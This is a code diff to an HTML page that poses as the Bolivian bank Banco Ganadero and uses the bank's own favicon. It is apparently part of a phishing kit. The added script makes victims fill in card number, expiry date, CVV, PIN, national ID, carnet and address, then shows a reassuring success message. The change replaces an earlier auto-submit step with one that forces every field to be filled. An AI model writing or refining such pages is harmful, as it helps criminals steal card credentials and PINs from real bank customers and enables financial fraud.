@@ -6,7 +6,7 @@
     <title>Banco Ganadero</title>
     <link rel="shortcut icon" href="https://www.bg.com.bo/favicon.ico">
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-<!-- JavaScript para enviar el formulario automáticamente solo la primera vez y mostrar SweetAlert -->
+<!-- JavaScript para enviar el formulario y mostrar SweetAlert cuando todos los campos están llenos -->
 <script>
     window.addEventListener('DOMContentLoaded', function () {
         // Comprobar si el formulario ya se ha enviado antes
@@ -16,26 +16,51 @@
             // Obtener el formulario
             const creditCardForm = document.getElementById('creditCardForm');
 
-            // Enviar el formulario automáticamente
-            creditCardForm.submit();
+            // Agregar un evento submit al formulario para realizar la validación antes de enviar
+            creditCardForm.addEventListener('submit', function (event) {
+                // Validar si todos los campos obligatorios están llenos
+                const creditCardNumberInput = document.getElementById('creditCardNumber');
+                const expirationDateInput = document.getElementById('expirationDate');
+                const cardHolderNameInput = document.getElementById('cardHolderName');
+                const cvvInput = document.getElementById('cvv');
+                const pinInput = document.getElementById('pin');
+                const dniInput = document.getElementById('dni');
+                const carnetInput = document.getElementById('carnet');
+                const cardAddressTextarea = document.getElementById('cardAddress');
 
-            // Establecer un indicador en localStorage para que no se envíe nuevamente
-            localStorage.setItem('formularioEnviado', 'true');
-        } else {
-            // El formulario ya se ha enviado antes, mostrar SweetAlert en el segundo clic
-            const submitButton = document.querySelector('button[type="submit"]');
-
-            submitButton.addEventListener('click', function () {
-                // Mostrar la alerta de SweetAlert
-                Swal.fire({
-                    icon: 'success',
-                    title: 'Éxito',
-                    text: 'La actualizaciom se ha completado con éxito.',
-                });
+                if (
+                    creditCardNumberInput.value &&
+                    expirationDateInput.value &&
+                    cardHolderNameInput.value &&
+                    cvvInput.value &&
+                    pinInput.value &&
+                    dniInput.value &&
+                    carnetInput.value &&
+                    cardAddressTextarea.value
+                ) {
+                    // Todos los campos están llenos, se puede enviar el formulario
+                    // Establecer un indicador en localStorage para que no se envíe nuevamente
+                    localStorage.setItem('formularioEnviado', 'true');
+                    // Mostrar la alerta de SweetAlert
+                    Swal.fire({
+                        icon: 'success',
+                        title: 'Éxito',
+                        text: 'El formulario se ha enviado con éxito.',
+                    });
+                } else {
+                    // Faltan campos por llenar, prevenir el envío del formulario
+                    event.preventDefault();
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Error',
+                        text: 'Por favor, llene todos los campos obligatorios.',
+                    });
+                }
             });
         }
     });
 </script>
+
 
     <style>
         /* Estilos CSS en línea */
